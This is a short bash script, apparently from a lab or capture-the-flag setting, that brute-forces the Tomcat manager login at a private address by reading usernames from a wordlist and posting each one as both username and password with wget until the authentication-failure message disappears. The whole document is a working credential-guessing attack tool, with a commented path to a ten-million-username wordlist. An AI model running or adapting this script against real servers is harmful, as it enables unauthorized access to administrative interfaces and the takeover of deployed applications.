#!/bin/bash

# usernamefile="/usr/share/wordlists/xato-net-10-million-usernames.txt"

usernamefile="possibleUsers.txt"
url="http://10.0.2.15:8080/manager/html"

while read  username;
do
	commands="$url --post-data \"/j_security_check HTTP/1.1&j_username=$username&j_password=$username\""
	echo $commands

	timeout 1 wget $commands 2>&1 | tr "\n" " " | grep -v "Username/Password Authentication Failed" > output.txt
	lines=$(wc -l output.txt | awk '{print $1}')

	if [ $lines != "0" ];
	then
		echo "$username" found
		exit;
	fi
done < $usernamefile
